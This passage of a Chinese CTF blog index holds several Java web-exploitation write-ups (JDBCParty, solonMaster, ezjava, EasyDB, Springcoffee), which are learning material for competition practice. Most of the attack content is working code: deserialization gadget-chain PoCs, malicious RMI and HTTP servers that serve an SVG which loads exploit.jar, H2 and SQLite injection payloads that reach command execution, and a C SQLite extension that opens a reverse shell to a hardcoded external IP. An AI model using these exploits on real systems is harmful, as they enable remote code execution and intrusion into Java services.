      map.put(&#x27;B&#x27;, new int[]&#123;0xc1, 0x82&#125;);        map.put(&#x27;C&#x27;, new int[]&#123;0xc1, 0x83&#125;);        map.put(&#x27;D&#x27;, new int[]&#123;0xc1, 0x84&#125;);        map.put(&#x27;E&#x27;, new int[]&#123;0xc1, 0x85&#125;);        map.put(&#x27;F&#x27;, new int[]&#123;0xc1, 0x86&#125;);        map.put(&#x27;G&#x27;, new int[]&#123;0xc1, 0x87&#125;);        map.put(&#x27;H&#x27;, new int[]&#123;0xc1, 0x88&#125;);        map.put(&#x27;I&#x27;, new int[]&#123;0xc1, 0x89&#125;);        map.put(&#x27;J&#x27;, new int[]&#123;0xc1, 0x8a&#125;);        map.put(&#x27;K&#x27;, new int[]&#123;0xc1, 0x8b&#125;);        map.put(&#x27;L&#x27;, new int[]&#123;0xc1, 0x8c&#125;);        map.put(&#x27;M&#x27;, new int[]&#123;0xc1, 0x8d&#125;);        map.put(&#x27;N&#x27;, new int[]&#123;0xc1, 0x8e&#125;);        map.put(&#x27;O&#x27;, new int[]&#123;0xc1, 0x8f&#125;);        map.put(&#x27;P&#x27;, new int[]&#123;0xc1, 0x90&#125;);        map.put(&#x27;Q&#x27;, new int[]&#123;0xc1, 0x91&#125;);        map.put(&#x27;R&#x27;, new int[]&#123;0xc1, 0x92&#125;);        map.put(&#x27;S&#x27;, new int[]&#123;0xc1, 0x93&#125;);        map.put(&#x27;T&#x27;, new int[]&#123;0xc1, 0x94&#125;);        map.put(&#x27;U&#x27;, new int[]&#123;0xc1, 0x95&#125;);        map.put(&#x27;V&#x27;, new int[]&#123;0xc1, 0x96&#125;);        map.put(&#x27;W&#x27;, new int[]&#123;0xc1, 0x97&#125;);        map.put(&#x27;X&#x27;, new int[]&#123;0xc1, 0x98&#125;);        map.put(&#x27;Y&#x27;, new int[]&#123;0xc1, 0x99&#125;);        map.put(&#x27;Z&#x27;, new int[]&#123;0xc1, 0x9a&#125;);    &#125;    public CustomObjectOutputStream(OutputStream out) throws IOException &#123;        super(out);    &#125;    @Override    protected void writeClassDescriptor(ObjectStreamClass desc) throws            IOException &#123;        String name = desc.getName();//        writeUTF(desc.getName());        writeShort(name.length() * 2);        for (int i = 0; i &lt; name.length(); i++) &#123;            char s = name.charAt(i);            //            System.out.println(s);            write(map.get(s)[0]);            write(map.get(s)[1]);        &#125;        writeLong(desc.getSerialVersionUID());        try &#123;            byte flags = 0;            if ((boolean)getFieldValue(desc,&quot;externalizable&quot;)) &#123;                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;                Field protocolField =                        ObjectOutputStream.class.getDeclaredField(&quot;protocol&quot;);                protocolField.setAccessible(true);                int protocol = (int) protocolField.get(this);                if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;                &#125;            &#125; else if ((boolean)getFieldValue(desc,&quot;serializable&quot;))&#123;                flags |= ObjectStreamConstants.SC_SERIALIZABLE;            &#125;            if ((boolean)getFieldValue(desc,&quot;hasWriteObjectData&quot;)) &#123;                flags |= ObjectStreamConstants.SC_WRITE_METHOD;            &#125;            if ((boolean)getFieldValue(desc,&quot;isEnum&quot;) ) &#123;                flags |= ObjectStreamConstants.SC_ENUM;            &#125;            writeByte(flags);            ObjectStreamField[] fields = (ObjectStreamField[])                    getFieldValue(desc,&quot;fields&quot;);            writeShort(fields.length);            for (int i = 0; i &lt; fields.length; i++) &#123;                ObjectStreamField f = fields[i];                writeByte(f.getTypeCode());                writeUTF(f.getName());                if (!f.isPrimitive()) &#123;                    Method writeTypeString =                            ObjectOutputStream.class.getDeclaredMethod(&quot;writeTypeString&quot;,String.class);                    writeTypeString.setAccessible(true);                    writeTypeString.invoke(this,f.getTypeString());//                    writeTypeString(f.getTypeString());                &#125;            &#125;        &#125; catch (NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalAccessException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchMethodException e) &#123;            throw new RuntimeException(e);        &#125; catch (InvocationTargetException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static Object getFieldValue(Object object, String fieldName) throws            NoSuchFieldException, IllegalAccessException &#123;        Class&lt;?&gt; clazz = object.getClass();        Field field = clazz.getDeclaredField(fieldName);        field.setAccessible(true);        Object value = field.get(object);        return value;    &#125;&#125;","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"软件安全赛初赛25--JDBCParty","url":"/2025/05/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%88%9D%E8%B5%9B25-JDBCParty/","content":"依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;3.5.5&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;    &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/com.oracle.database.jdbc/ojdbc11 --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.oracle.database.jdbc&lt;/groupId&gt;    &lt;artifactId&gt;ojdbc11&lt;/artifactId&gt;    &lt;version&gt;21.14.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-jdbc&lt;/artifactId&gt;    &lt;version&gt;10.1.31&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt;    &lt;artifactId&gt;batik-swing&lt;/artifactId&gt;    &lt;version&gt;1.14&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba.fastjson2&lt;/groupId&gt;    &lt;artifactId&gt;fastjson2&lt;/artifactId&gt;    &lt;version&gt;2.0.37&lt;/version&gt;&lt;/dependency&gt;\n\n一道jdk17的题先分析能利用的资源：\n\nspringboot自带的jackson链\nfastjson2的原生反序列化链\nspringboot里带的tomcat-embed-core，有BeanFactory，可以在JNDI的时候用。这里是10.1.31版本，那forceString用不了，但是还是可以触发setter\nojdbc，没见过。但是和数据库有关的，要么是直接jdbc，比如经典的mysql-jdbc，要么是打jndi。目前高版本jdk的题，如果是内存数据库喜欢考jdbc，如果不是内存数据库喜欢考jndi。等下可以注意一下里面是否有jndi注入点\nbatik-swing，没见过，且没思路。看了wp才知道是和jndi结合起来用，算高版本jndi之xxe利用吧。参考 JDK CVE-2023-21939 分析利用\n\n看一下题目的反序列化点：\n\n很直接，就是直接反序列化\n\n现在能够大概确定一个思路：1、EventListenerList+fastjson2&#x2F;jackson，触发getter2、某个getter触发jndi3、jndi结合batik-swing实现rce\nOracleCachedRowSet链现在尝试找一下有没有能触发jndi的getter，这里用tabby找：\n建议路径一开始别设置太长，先从短链找起。排除一些不能序列化，没有exports的类后，能够发现oracle.jdbc.rowset.OracleCachedRowSet#getConnection。具体看一下它调用的getConnectionInternal，能够发现是可用的，不过只有rmi协议可用，因为有个validateJNDIName()，里面不允许ldap。\n后面还不太清楚，先搬运一下。\n先起rmi服务器：\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.StringRefAddr;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer &#123;    public static void main(String[] args) throws Exception &#123;        System.out.println(&quot;Creating evil RMI registry on port 1097&quot;);        Registry registry = LocateRegistry.createRegistry(1097);        ResourceRef ref = new ResourceRef(&quot;org.apache.batik.swing.JSVGCanvas&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);        ref.add(new StringRefAddr(&quot;URI&quot;, &quot;http://localhost:8886/1.xml&quot;));        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);        registry.bind(&quot;remoteobj&quot;, referenceWrapper); //Client处访问rmi://localhost:1097/remoteobj    &#125;&#125;\n\n再起xml服务器：\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import java.io.IOException;import java.io.OutputStream;import java.net.InetSocketAddress;public class XmlServer &#123;    public static void main(String[] args) throws IOException &#123;        HttpServer server = HttpServer.create(new InetSocketAddress(8886), 0);        server.createContext(&quot;/1.xml&quot;, new Xml1Handler());        server.createContext(&quot;/2.xml&quot;, new Xml2Handler());        server.setExecutor(null);        server.start();        System.out.println(&quot;Server started on port 8886&quot;);    &#125;    static class Xml1Handler implements HttpHandler &#123;        @Override        public void handle(HttpExchange exchange) throws IOException &#123;            exchange.getResponseHeaders().set(&quot;Content-Type&quot;, &quot;application/xml&quot;);            exchange.getResponseHeaders().set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            exchange.sendResponseHeaders(200, 0);            String xml = &quot;&lt;svg xmlns=\\&quot;http://www.w3.org/2000/svg\\&quot; &quot; +                    &quot;xmlns:xlink=\\&quot;http://www.w3.org/1999/xlink\\&quot; &quot; +                    &quot;version=\\&quot;1.0\\&quot;&gt; &lt;script type=\\&quot;application/java-archive\\&quot; &quot; +                    &quot;xlink:href=\\&quot;http://localhost:8887/exploit.jar\\&quot;/&gt; &quot; +                    &quot;&lt;text&gt;Static text ...&lt;/text&gt; &lt;/svg&gt;&quot;;            OutputStream responseBody = exchange.getResponseBody();            responseBody.write(xml.getBytes());            responseBody.close();        &#125;    &#125;    static class Xml2Handler implements HttpHandler &#123;        @Override        public void handle(HttpExchange exchange) throws IOException &#123;            exchange.getResponseHeaders().set(&quot;Content-Type&quot;, &quot;application/xml&quot;);            exchange.getResponseHeaders().set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            exchange.sendResponseHeaders(200, 0);            String xml = &quot;&lt;svg xmlns=\\&quot;http://www.w3.org/2000/svg\\&quot; width=\\&quot;100\\&quot; &quot; +                    &quot;height=\\&quot;100\\&quot;&gt; &lt;circle cx=\\&quot;50\\&quot; cy=\\&quot;50\\&quot; r=\\&quot;50\\&quot; fill=\\&quot;green\\&quot; &quot; +                    &quot;onload=\\&quot;showFrame()\\&quot;/&gt; &lt;script type=\\&quot;text/ecmascript\\&quot;&gt; &quot; +                    &quot;importPackage(Packages.java.lang); function showFrame() &#123; &quot; +                    &quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;); &#125; &lt;/script&gt; &lt;/svg&gt;&quot;;            OutputStream responseBody = exchange.getResponseBody();            responseBody.write(xml.getBytes());            responseBody.close();        &#125;    &#125;&#125;\n\n再起http服务器：\n这个直接python -m http.server 8887 也一样\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.InetSocketAddress;public class JarServer &#123;    public static void main(String[] args) throws IOException &#123;        HttpServer server = HttpServer.create(new InetSocketAddress(8887), 0);        server.createContext(&quot;/exploit.jar&quot;, new BinaryHandler());        server.setExecutor(null);        server.start();        System.out.println(&quot;Server started on port 8887&quot;);    &#125;    public static byte[] readInputStream(InputStream inputStream) &#123;        byte[] temp = new byte[4096];        int readOneNum = 0;        ByteArrayOutputStream bos = new ByteArrayOutputStream();        try &#123;            while ((readOneNum = inputStream.read(temp)) != -1) &#123;                bos.write(temp, 0, readOneNum);            &#125;            inputStream.close();        &#125; catch (Exception ignored) &#123;        &#125;        return bos.toByteArray();    &#125;    static class BinaryHandler implements HttpHandler &#123;        @Override        public void handle(HttpExchange exchange) throws IOException &#123;            System.out.println(&quot;get request&quot;);            byte[] data = readInputStream(JarServer.class.getClassLoader()                    .getResourceAsStream(&quot;exploit.jar&quot;));            exchange.getResponseHeaders().set(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;);            exchange.getResponseHeaders().set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            exchange.sendResponseHeaders(200, data.length);            OutputStream responseBody = exchange.getResponseBody();            responseBody.write(data);            responseBody.close();        &#125;    &#125;&#125;\n\njar包里的内容：\nimport org.w3c.dom.events.Event;import org.w3c.dom.events.EventListener;import org.w3c.dom.svg.EventListenerInitializer;import org.w3c.dom.svg.SVGDocument;import org.w3c.dom.svg.SVGSVGElement;public class Exploit implements EventListenerInitializer &#123;    public Exploit() &#123;    &#125;    public void initializeEventListeners(SVGDocument document) &#123;        SVGSVGElement root = document.getRootElement();        EventListener listener = new EventListener() &#123;            public void handleEvent(Event event) &#123;                try &#123;                    Runtime.getRuntime().exec(&quot;calc.exe&quot;);                &#125; catch (Exception e) &#123;                &#125;            &#125;        &#125;;        root.addEventListener(&quot;SVGLoad&quot;, listener, false);    &#125;&#125;\n\n最终Pocpackage com.example.solution;import com.alibaba.fastjson2.JSONArray;import com.fasterxml.jackson.databind.node.POJONode;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import oracle.jdbc.rowset.OracleCachedRowSet;import javax.swing.event.EventListenerList;import java.io.FileOutputStream;import java.util.Base64;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;//        Tools17.bypassModule(Poc.class);        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();        oracleCachedRowSet.setDataSourceName(&quot;rmi://localhost:1097/remoteobj&quot;);        Object o = GadgetUtils17.makeObjectAopProxy(oracleCachedRowSet);        JSONArray jsonArray = new JSONArray();        jsonArray.add(o);        POJONode node = GadgetUtils17.JacksonToString2GetterBetter(oracleCachedRowSet);//        POJONode nodes = GadgetUtils17.JacksonToString2GetterBetter(oracleCachedRowSet);        EventListenerList list = GadgetUtils17.eventListenerList(jsonArray);        byte[] ser = Tools17.ser(list);        String s = Base64.getEncoder().encodeToString(ser);        new FileOutputStream(&quot;D://1tmp//payload.txt&quot;).write(s.getBytes());        Tools17.deser(ser);    &#125;&#125;\n\n\n\nLdapAttribute链这个方法我没试过，不过应该也可以\n可以看JDK17打Jackson+LdapAttruibute反序列化 | GSBP’s Blog\n参考https://github.com/Y4Sec-Team/CVE-2023-21939\n来自三道高版本JDK的JDBC连打combo - EddieMurphy’s blog\n软件攻防赛JDBCParty赛后解-先知社区\n高版本JNDI注入-高版本Tomcat利用方案-先知社区 这里有讲BeanFactory还能触发setter\n从2025系统安全防护赛JDBCParty学习高版本JDK和高版本Tomcat打JNDI到RCE | J1rrY’s Blog 这里具体讲了jar包怎么来\n探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 这里讲了高版本下jndi怎么打，有提到本题的xxe利用\nJDK CVE-2023-21939 分析利用batik-swing 组件造成的 rce 漏洞-先知社区 关于本题batik-swing怎么用\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"CISCN24决赛-solonMaster","url":"/2025/05/09/CISCN24%E5%86%B3%E8%B5%9B-solonMaster/","content":"前言考察原生fastjson链的引用绕过和toString链\n分析有fastjson83的依赖，很可能要用toString触发。\n看一下题目的几个主要类，首先是DemoController：\n反序列化的点很明显，主要是怎么绕。需要满足是User的子类，并且不能有BadAVE。\n那可以由EventListenerList—&gt;JSONArray.toString–&gt;getter\n再看User：\n这里有一个Map类，那就考虑从HashMap.readObject开始的反序列化。\n这里结合EXP的注释理解吧：主要理解为什么可以通过hashmap绕过\nimport com.alibaba.fastjson.JSONArray;import com.example.demo.User;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.management.BadAttributeValueExpException;import javax.swing.event.EventListenerList;import javax.swing.undo.UndoManager;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;public class EXP &#123;    public static void main(String[] args) throws Exception &#123;        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\tmp\\\\classes\\\\CalcAbs.class&quot;));        byte[][] codes = &#123;code&#125;;        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_name&quot;, &quot;useless&quot;);        setFieldValue(templates, &quot;_tfactory&quot;,  new TransformerFactoryImpl());        setFieldValue(templates, &quot;_bytecodes&quot;, codes);//        ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;();//        list.add(templates);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        EventListenerList elist = new EventListenerList();        UndoManager manager = new UndoManager();        Vector vector = (Vector) getFieldValue(manager, &quot;edits&quot;);        vector.add(jsonArray);        setFieldValue(elist, &quot;listenerList&quot;, new Object[] &#123; Map.class, manager &#125;);        // 这里是为了绕fastjson自己的resolveClass，让其走TC_REFERENCE，就不会走它的resolveClass，也就不会触发autoType        //到时候先反序列化User里的Map类，就是HashMap。先反序列化键，就是templates。然后是elist，从而触发elist.readObject--&gt;toString        //由于templates已经在前面反序列化过，所以不会被fastjson的黑名单拦截        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(templates, elist);        User user = new User();        user.setInfo(hashMap);        byte[] serilize = serilize(user);        String s = Base64.getEncoder().encodeToString(serilize);        new FileOutputStream(new File(&quot;D:\\\\tmp\\\\payload.txt&quot;)).write(s.getBytes());//        deserialize(s);    &#125;    static Object deserialize(String data) throws Exception &#123;        return new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(data))) &#123; // from class: com.example.demo.DemoController.1            boolean check = false;            @Override // java.io.ObjectInputStream            protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;                Class targetc = super.resolveClass(desc);                if (!this.check &amp;&amp; !User.class.isAssignableFrom(targetc)) &#123;                    throw new IllegalArgumentException(&quot;HackerClass:&quot; + targetc);                &#125; else if (BadAttributeValueExpException.class.isAssignableFrom(targetc)) &#123;                    throw new IllegalArgumentException(&quot;HackerClass:&quot; + targetc);                &#125; else &#123;                    this.check = true;                    return targetc;                &#125;            &#125;        &#125;.readObject();    &#125;    public static byte[] serilize(Object obj) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(obj);        oos.close();        return baos.toByteArray();    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException, NoSuchFieldException &#123;        Field declaredField = obj.getClass().getDeclaredField(fieldName);        declaredField.setAccessible(true);        declaredField.set(obj, value);    &#125;    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException &#123;        Class&lt;?&gt; aClass = obj.getClass();        Field field =null;        while (aClass != null) &#123;            try &#123;                field = aClass.getDeclaredField(fieldName);                field.setAccessible(true);                return field.get(obj);            &#125; catch (NoSuchFieldException e) &#123;                aClass = aClass.getSuperclass();            &#125;        &#125;        return null;    &#125;&#125;\n\npython脚本：当时POST的数据格式还调了好久\nimport base64import requestsfrom urllib.parse import quoteif __name__ == &#x27;__main__&#x27;:    with open(&quot;D://tmp//payload.txt&quot;, &quot;r&quot;) as f:        # header = b&#x27;\\x63\\x02\\x00\\x48\\x00\\x04&#x27; + b&#x27;test&#x27;        payload = f.read()        # b64 = base64.b64encode(payload)    url = &quot;http://127.0.0.1:8004/api&quot;    json = &#123;        &quot;map&quot;: &#123;            &quot;data&quot;: f&quot;&#123;payload&#125;&quot;        &#125;,        &quot;a&quot;: &quot;a&quot;    &#125;    headers = &#123;        &quot;Content-Type&quot;: &quot;application/json&quot;    &#125;    res = requests.post(url, json=json, headers=headers)    print(res.text)    # print(b64)\n\n\n\n总结这里主要学高版本fastjson原生反序列化引用绕过的原理，toString链的话除了上面用到的EventListenerList，还有TextAndMnemonicHashMap等\n参考文章 - 高版本Fastjson反序列化Xtring新链和EventListenerList绕过 - 先知社区\n2024Ciscn总决赛Web Writeup - F12~ - 博客园\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"CISCN24_ezjava","url":"/2025/05/09/CISCN24-ezjava/","content":"前言考察sqliite加载so文件实现RCE。\n分析首先你需要知道，sqlite是一个内存数据库，直接存储在本地，没有server，client一说。一个sqlite数据库就是一个文件，类似test.db。你可以随机新建一个db文件，然后创建sqlite时打开，这样之后产生的数据都会写在这个db文件上。sqlite无法跟mysql一样返回反序列化数据，只能通过加载so文件实现RCE\n这题有两种解法，一是通过AspectJ写so文件，然后sql注入加载so文件；二是利用sqlite缓存数据库的特性，先让靶机获取so文件，并算出重命名后的so文件，然后再连接恶意db，实现加载so文件。\n方法1依赖里有AspectJ组件，又可以用JDBC mysql反序列化，那就可以任意写文件。那我们写一个so文件。\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;dirent.h&gt;#include &lt;sqlite3ext.h&gt;#include &lt;sys/stat.h&gt;SQLITE_EXTENSION_INIT1/* Configuration for the TCP connection */int tcp_port = 5555;char *ip = &quot;129.204.197.19&quot;;#ifdef _WIN32__declspec(dllexport)#endif/** * Initializes the SQLite extension. * * @param db SQLite database pointer * @param pzErrMsg Error message pointer * @param pApi SQLite API routines pointer * @return SQLITE_OK on success */int sqlite3_extension_init(    sqlite3 *db,    char **pzErrMsg,    const sqlite3_api_routines *pApi) &#123;    int rc = SQLITE_OK;    SQLITE_EXTENSION_INIT2(pApi);    /* Establish a TCP connection and spawn a shell if running in a child process */    int fd;    if ((fork()) &lt;= 0) &#123;        struct sockaddr_in addr;        addr.sin_family = AF_INET;        addr.sin_port = htons(tcp_port);        addr.sin_addr.s_addr = inet_addr(ip);        fd = socket(AF_INET, SOCK_STREAM, 0);        if (connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) != 0) &#123;            exit(0); // Exit if connection fails        &#125;        // Redirect standard file descriptors to the socket        dup2(fd, 0);        dup2(fd, 1);        dup2(fd, 2);        // Execute bash shell        execve(&quot;/bin/bash&quot;, NULL, NULL);    &#125;    return rc;&#125;\n\ngcc -g -fPIC -shared rce.c -o rce.so\n在linux环境下编译成so。\n这里假设写入&#x2F;tmp&#x2F;rce.so\n我们用navicat新建一个基于user.db(新建txt改后缀就行)的sqlite，然后在里面新建一张user表，两个字段。\nPOST请求选择type3，如果参数里有tableName，就会执行下面的语句：\n这里就可以注入。\n写完文件后这样发POST请求就行\n&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://10.195.247.79:7776/user.db&quot;,&quot;tableName&quot;:&quot;user union select 1,load_extension(&#x27;/tmp/rce.so&#x27;)&quot;&#125;\n\n至于url的格式为什么是这样的，去看org.sqlite.core.CoreConnection#open就知道了，这样写才能加载远程的db文件到本地。\n方法2假如我们不能任意写文件，我们仍可以加载so文件，因为sqlite有缓存机制。如果是从远程加载的db，那么该db从远程加载后，会保存到本地的一个特定路径，该路径可以计算，具体计算方法看org.sqlite.core.CoreConnection#extractResource\n下面是计算文件名的方法：\npackage solution;import java.net.MalformedURLException;import java.net.URL;public class hashName &#123;    public static void main(String[] args) throws MalformedURLException &#123;        URL resourceAddr = new URL(&quot;http://10.195.247.79:7776/rce.so&quot;);        String dbFileName = String.format(&quot;sqlite-jdbc-tmp-%d.db&quot;, resourceAddr.hashCode());        System.out.println(dbFileName);        //sqlite-jdbc-tmp--1989922468.db    &#125;&#125;\n\n其实就是hashCode一下我们的url。\n接着就是加载so文件了(实际上已经是sqlite-jdbc-tmp–1989922468.db)。除了方法1里面的sql注入，还可以用另一种方法。我们可以用navicat以exp.db为基础创建一个sqlite3数据库。之后执行\ncreate view security as select (select load_extension(&#x27;/tmp/sqlite-jdbc-tmp--1989922468.db&#x27;));\n\n这样会新建一个视图。\n当我们先传入so文件后，POST下面的即可\n&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://10.195.247.79:7776/exp.db&quot;,&quot;tableName&quot;:&quot;security&quot;&#125;\n\n实际上就是select * from security ，而security里面有我们创建的恶意视图，最终就是执行select load_extension(‘&#x2F;tmp&#x2F;sqlite-jdbc-tmp–1989922468.db’)\n总结这题主要学了一下sqlite实现rce，这也是第一次遇到sql到rce吧。\n参考CISCN2024 writeup（web部分）\nhttps://xz.aliyun.com/news/14234\n2024CISCN_WEB_ezjava题解 | P0l@R19ht\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"N1CTF25-EasyDB","url":"/2025/05/09/N1CTF25-EasyDB/","content":"记录一下踩坑\n1、executeQuery 可以执行 create\n一开始以为executeQuery 不能执行create 操作。但是后来发现是可以的，只需要在前面加一个select 语句就行。\nselect 1;CREATE ALIAS RT AS 。。。。\n\n2、SQL语句中，单引号和双引号的意义不一样\n最后CALL RT(‘calc’);时，一开始用的是双引号，但是双引号会报错：Column “calc” not found; SQL statement:\nCALL RT(“calc”);\n这是因为在 H2 SQL 中，字符串字面量通常使用单引号（’）来包围。双引号（”）在 SQL 中通常用于标识标识符，如表名、列名等。因此，当你在 CALL RT(“calc”) 中使用双引号时，SQL 解释器会将其解释为一个标识符（例如列名），而不是字符串字面量，从而导致错误。\n其他数据库也有这种特性，之后要注意。\n3、h2sql 的注释符只有 – \n一开始用的是#，一直报错。后面查了一下发现没有 #。这点跟mysql 不一样。\n这里主要考察的其实是黑名单绕过，用的是Java的字符串拼接。一开始想到其他编码方式绕过，其实不用这么麻烦。以后应该先考虑这种拼接绕过。\n总结一下，基于字符串的过滤，可以通过：拼接，编码，运算(异或、取反)等方法绕过。\n最终post参数：\naa&#x27;;CREATE ALIAS RT AS $$ void rt(String cmd) throws java.lang.Exception &#123;java.lang.Class&lt;?&gt; run = java.lang.Class.forName(&quot;java.lang.Run&quot; + &quot;time&quot;);java.lang.reflect.Method getr = run.getMethod(&quot;getRun&quot;+&quot;time&quot;);java.lang.reflect.Method ex = run.getMethod(&quot;exe&quot; + &quot;c&quot;, String.class);ex.invoke(getr.invoke(null), &quot;calc&quot;);&#125;$$;CALL RT(&#x27;calc&#x27;);--\n\n\n\nusername=aa%27%3BCREATE%20ALIAS%20RT%20AS%20%24%24%20void%20rt%28String%20cmd%29%20throws%20java.lang.Exception%20%7Bjava.lang.Class%3C%3F%3E%20run%20%3D%20java.lang.Class.forName%28%22java.lang.Run%22%20%2B%20%22time%22%29%3Bjava.lang.reflect.Method%20getr%20%3D%20run.getMethod%28%22getRun%22%2B%22time%22%29%3Bjava.lang.reflect.Method%20ex%20%3D%20run.getMethod%28%22exe%22%20%2B%20%22c%22%2C%20String.class%29%3Bex.invoke%28getr.invoke%28null%29%2C%20%22calc%22%29%3B%7D%24%24%3BCALL%20RT%28%27calc%27%29%3B--&amp;password=123","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"suctf25-sujava","url":"/2025/05/09/suctf25-sujava/","content":"主要考察JDBC mysql\n这里主要学到一种新的连接语法\njdbc:mysql:&#x2F;&#x2F;address&#x3D;(host&#x3D;myhost)(port&#x3D;1111)(key1&#x3D;value1)&#x2F;db#\n结合URL编码，这样可以绕过更多。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"MRCTF22 Springcoffee","url":"/2025/05/09/MRCTF22-Springcoffee/","content":"前言高版本kyro反序列化，二次反序列化绕transit属性，controller内存马注入，rasp绕过（forkAndExec绕过）\n这题考的东西很多，而且很复杂，当时复现花了两天才搞好，不过也是学到了很多东西\n分析组件自己看吧，很容易确定是kyro入口。依赖里也用rometools，那么就可以考虑ROME链，也就是toString–&gt;getter。rasp是注入内存马读文件后才发现的，后面在分析\n高版本kryo绕过这里kyro是5.3.0版本的，之前在ciscn23里考过一道seaclouds，那里面的kryo是4.x.x版本的。这两个版本有一些不同，下面分析。\nkyro跟hessian一样，都是基于field机制的。一般入口点可以是HashMap#hashcode，因为里面反序列化HashMap类型数据的时候会调用put还原，而put的时候一定会用hashcode检查键是否重复。另外，也可以从equals入手，那就可以走HotSwap那条，最终也是可以触发toString\n不过kryo4直接序列化就行，kryo5里面却加了一些限制。下面参照Y4的文章2022MRCTF-Java部分，开始分析\n首先这里链子是比较简单的，要注意的就是需要有二次反序列化，因为kyro不能序列化transit的属性，而TemplatesImpl的_tfactory就是transit属性。\n大致链子如下：\nHashMap#putVal#equalsHotSwappableTargetSource#equalsXString#equalsToStringBean#toStringSignedObject#getObjectHashMap#readObjectHashMap#hashEqualsBean#hashCodeToStringBean#toStringTemplateImpl#getter\n\n当然，前半段用ROME链触发也可以。\n先不放阶段性EXP了，强烈建议先去后面看完整的，把讲到的部分看了就行，后面也是这样。这里如果构造好EXP去测试的话是会报错的：\n说是HashMap的Class没注册。这里我们回去看一下Controller里的逻辑是怎么写的：\n\n两个路由，第一个很明显是反序列化的，那第二个是用来干什么的呢？简单分析可以知道，它是用来调用kryo里的任意setter方法的。解决报错的关键就在于调用什么setter方法，传入什么参数。我们知道，kryo反序列化的关键就是调用com.esotericsoftware.kryo.serializers.MapSerializer进行反序列化。\n知道上面这些后，我们再去定位到报错的位置：\n报错在这里，那我们调整这个值为false是不是就可以了呢？正好又有对应的set方法，去尝试一下，发现确实可以。此时它会执行com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit&#x3D;&gt;com.esotericsoftware.kryo.Kryo#getDefaultSerializer最终获取到我们需要的com.esotericsoftware.kryo.serializers.MapSerializer\n不过出现了新的报错：意思是反序列化的类需要有无参构造\n这个报错怎么